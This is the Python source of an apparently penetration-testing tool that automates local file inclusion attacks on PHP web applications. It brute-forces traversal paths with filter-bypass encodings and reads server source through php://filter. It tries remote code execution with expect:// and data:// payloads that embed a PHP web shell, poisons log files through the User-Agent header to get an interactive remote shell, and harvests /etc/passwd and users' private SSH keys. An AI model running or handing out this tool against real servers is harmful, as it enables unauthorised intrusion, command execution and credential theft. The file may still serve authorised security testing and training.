import requests
import sys
import optparse
import re
from base64 import b64decode
import time 


USER_AGENT = {"User-Agent":"LFI-FUZZ/1.0"}

def validate_url(url):
    '''Validates that the url is of the expected format for the LFI fuzzer to know what to replace'''
    if not url or "?" not in url:
        print("[-] - PLEASE ENSURE THAT YOU SPECIFY A URL!")
        sys.exit(1)

    if not url.startswith("http"):
        url = "http://" + url

    if "LFI" not in url:
        url += "LFI"

    return url


def find_traversal(url, filter_str, page_len, traversal_page):
    '''Iterates through different possible traverslas, as well as bypassing blacklists'''
    traversal = ""
    traverse_str = "/.."
    depth = 0

    print("\n[*] - FINDING TRAVERSAL PATH...")

    while True:
        sys.stdout.write(f"\r[*] - ATTEMPT: {traversal}")
        r = requests.get(url.replace("LFI", traversal + traversal_page))
        if check_successful_lfi(r.text, filter_str=filter_str, page_len=page_len):
            return traversal
        
        depth += 1

        if depth == 10:
            if traverse_str == "/..":
                traverse_str = "/.*"
                depth = 1
            elif traverse_str == "/.*":
                traverse_str = "/.?"
                depth = 1
            elif traverse_str == "/.?":
                traverse_str = "/..../"
                depth = 1
            elif traverse_str == "/..../":
                traverse_str = "%2e%2e%2f"
                depth = 1
            elif traverse_str == "%2e%2e%2f":
                traverse_str = "%2f%2e%2e%2e%2e%2f"
                depth = 1
            else:
                return None

        traversal = traverse_str * depth


def check_successful_lfi(resp_text, filter_str="", page_len=0):
    '''checks if the lfi has been successful based on the default, no parameter passed page length, and filter string if it is set'''
    if filter_str:
        if filter_str not in resp_text and len(resp_text) != page_len:
            return True
    elif len(resp_text) != page_len:
        return True
    
    return False


def make_request(url, traversal, filename):
    '''makes a request for a file utilising the traversal path found'''
    payload = traversal + filename
    this_url = url.replace("LFI", payload)
    return requests.get(this_url, headers=USER_AGENT), this_url


def test_code_exec(url): 
    '''test code execution using php wrappers'''
    print("\n[*] - TESTING CODE EXECUTION WITH PHP WRAPPERS")

    r, url_used = make_request(url, "expect://", "echo watchdog was here")
    if 'watchdog was here' in r.text and "echo" not in r.text:
        print("[+] - RCE WORKS WITH 'expect://' WRAPPER: " + url_used)
    else:
        print("[-] - UNSUCCESSFUL WITH 'expect://' WRAPPER: " + url_used)
    
    r, url_used = make_request(url, "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NtZF0pOyA/Pgo=", "&cmd=echo watchdog was here")
    if 'watchdog was here' in r.text and "echo" not in r.text:
        print("[+] - RCE WORKS WITH 'data://' WRAPPER: " + url_used)
    else:
        print("[-] - UNSUCCESSFUL WITH 'data://' WRAPPER: " + url_used)
    
    r, url_used = make_request(url, "data://text/plain,<?php echo passthru($_GET['cmd']) ?>", "&cmd=echo watchdog was here")
    if 'watchdog was here' in r.text and "echo" not in r.text:
        print("[+] - RCE WORKS WITH 'data://' WRAPPER: " + url_used)
    else:
        print("[-] - UNSUCCESSFUL WITH 'data://' WRAPPER: " + url_used)


def read_page(url, page, quiet=False):
    '''reads the source code of a particular specified page from the web server using a base64 php filter. 
    We can see any server side source code'''
    if not quiet:
        print(f"\n[*] - ATTEMPTING TO READ DATA INSIDE OF {page} USING THE php://filter")

    r, this_url = make_request(url, "php://filter/read=convert.base64-encode/resource=", page)
    base64regex = re.compile(r'(?:[A-Za-z0-9+/]{4}){2,}(?:[A-Za-z0-9+/]{2}[AEIMQUYcgkosw048]=|[A-Za-z0-9+/][AQgw]==)')
    pagesource = base64regex.findall(r.text)   
    if pagesource:
        if not quiet:
            print("[+] - READ IN PAGE DATA WITH URL: " + this_url)
        return b64decode("".join(pagesource)).decode()
    elif page.endswith(".php"):
        return read_page(url, page.replace(".php", ""))
    else:
        if not quiet:   
            print("[-] - FAILED TO READ PAGE WITH URL: " + this_url)

    return None


def read_file(url, traversal, filename, quiet=False):
    '''reads the contents of a file from the webserver'''
    if filename.startswith("/"):
        page_data = read_page(url, traversal + filename, quiet=quiet)
    else:
        this_attempt = ""
        for attempt in traversal.split("/"):
            this_attempt += attempt + "/"
            page_data = read_page(url, this_attempt + filename, quiet=quiet)
            if page_data:
                return page_data
    return page_data


def extract_users(url, traversal):
    '''Accesses the /etc/passwd file and extracts all valid user's homes'''
    users_list_raw = read_file(url, traversal, "/etc/passwd", quiet=True)
    
    if users_list_raw:
        user_list = users_list_raw.split("\n")
        users_home = []

        for user in user_list:
            if "/bin" in user:
                users_home.append(user.split(":")[-2])
        
        return users_home
    else:
        print("[-] - UNFORTUNATELY THE /ETC/PASSWD FILE COULD NOT BE ACCESSED...")


def log_poison_check(url, traversal, logfile):
    '''checks if log poisoning is possible'''
    resp = read_file(url, traversal, logfile, quiet=True)
    if (resp and USER_AGENT["User-Agent"] in resp) or USER_AGENT["User-Agent"] in make_request(url, traversal, logfile)[0].text:
        print("[!] - LOG POISONING POSSIBLE WITH USER AGENT FIELD! POISONING FILE...")

        log_poison(url, traversal, logfile)

        while True:
            user_cmd = input("\nSHELL> ")
            if user_cmd.upper() == "QUIT" or user_cmd.upper() == "EXIT":
                break
            log_poison_shell(url, traversal+logfile, user_cmd)
    else:
        print("[!] - POTENTIAL LOG POISONING POSSIBLE - CHECK WHAT IS SHOWN IN THIS FILE THAT YOU CAN CONTROL - EG: USER AGENT STRING, or REFERRER")


def log_poison(url, traversal, logfile):
    '''Actually exploits the log poisoning by making the user agent a php block of code'''
    user_agent = {"User-Agent": "<?php echo passthru($_GET['cmd']) ?>"}
    requests.get(url.replace("LFI", traversal + logfile), headers=user_agent)
    time.sleep(5) # sleep so the log file has time to get the php code inside.
    print(f"[+] - Exploit the log file poisioning by visiting the URL: {url.replace('LFI', traversal + logfile)}&cmd=YOURCOMMAND")


def log_poison_shell(url, path, command, depth=0):
    '''This handles user commands, and works as a 'shell' for when log poisoning has occured'''
    command = f"echo+AAAAAAAAAAAAA;+{command};+echo+AAAAAAAAAAAAA"
    r = make_request(url, path, "&cmd=" + command)[0].text

    output = r.split("AAAAAAAAAAAAA")

    if len(output) < 2 and depth < 10: #can get stuck in infinite loop
        log_poison_shell(url, path, command, depth=depth+1)
    elif depth > 10:
        print("[-] - Command Execution seems to not be working from our end - try doing it manually by visiting the URL specified above... Sorry!")
        sys.exit(1)
    else:
        cmd_result = output[1].strip()
        if cmd_result:
            print(cmd_result)
        else:
            print("[-] - COMMAND FAILED")
    

def main():
    # Setting up the arg parser
    arg_parser = optparse.OptionParser()
    arg_parser.add_option("-u", "--url", dest="url", help="The URL you wish to test: http://www.example.com/index.php?page=LFI")
    arg_parser.add_option("--traversal-file", dest="traversal_file", help="Specify your own file to search for with LFI - by default this is /etc/passwd, but some php filters will add a file extension")
    arg_parser.add_option("--filter", dest="filter_str", help="An error string that appears commonly on the page when you try to load in an invalid file: 'ERROR - cannot find'. NOTE - this is case sensitive")
    arg_parser.add_option("--custom-file-list", dest="custom_list", help="Specify your own list of files to attempt to find through the LFI")
    arg_parser.add_option("--read-file", dest="file_to_read", help="Specify your own file to attempt to read through the LFI - must specify absolute path: passwd is not enough to get the /etc/passwd")

    (options, args) = arg_parser.parse_args()

    url = validate_url(options.url)

    # default value
    traversal_file = "/etc/passwd" 
    # getting user preference for the traversal file
    if options.traversal_file: 
        traversal_file = options.traversal_file

    # default value
    filter_str = "" 
    # getting user preference for the filter string
    if options.filter_str: 
        filter_str = options.filter_str
    
    # default value
    wordlist = "lfi-wordlist.txt" 
    # getting user preference for the custom file list
    if options.custom_list: 
        wordlist = options.custom_list

     # read in files from the file list
    with open(wordlist, "r") as f:
        filelist = f.read().split('\n')

    # default value
    file_to_read = "" 
    if options.file_to_read:
        file_to_read = options.file_to_read

    #attempting to read source code of the current page so we can discover any filters or blacklists in place
    page = "/".join(url.split("/")[3:]).split("?")[0]
    page_data = read_page(url, page)
    if page_data:
        print(page_data)

    # get the default page length with an empty parameter to be able to filter out this length
    page_len = len(requests.get(url.replace("LFI", "")).text) 
    traversal = find_traversal(url, filter_str, page_len, traversal_file)

    if traversal == None:
        print("\n[-] - TRAVERSAL PATH NOT FOUND...")
        sys.exit(1)
    
    print("\n[+] - TRAVERSAL PATH FOUND: " + traversal + traversal_file)

    # once the traversal is found, we can attempt to read the file which the user specified
    if file_to_read:
        data = read_file(url, traversal, file_to_read)
        if data:
            print(data)
        sys.exit(1)

    #test code execution
    test_code_exec(url)

    # begin finding files from the list
    print("\n[*] - FINDING FILES...")
    for f in filelist:
        r, this_url = make_request(url, traversal, f)
        if check_successful_lfi(r.text, filter_str=filter_str, page_len=page_len):
            print("\n[+] - SUCCESSFUL LFI: " + this_url)
            time.sleep(0.5)
            if "log" in f:
                log_poison_check(url, traversal, f)
            if "conf" in f:
                print("[!] - CONFIG FILE - READ FOR POTENTIAL PASSWORDS!")

    # extract the users from /etc/passwd and see if we cna find their SSH dir
    home_dirs = extract_users(url, traversal)
    for directory in home_dirs:
        users_key = directory + "/.ssh/id_rsa"
        ssh_key_b64 = read_page(url, traversal + users_key, quiet=True)
        if ssh_key_b64:
            print("[+] - USERS SSH KEY FOUND: " + users_key)
            print(b64decode(ssh_key_b64).decode())
        else:
            print("[-] - UNABLE TO ACCESS THE FILE " + users_key)
   


if __name__ == "__main__":
    main()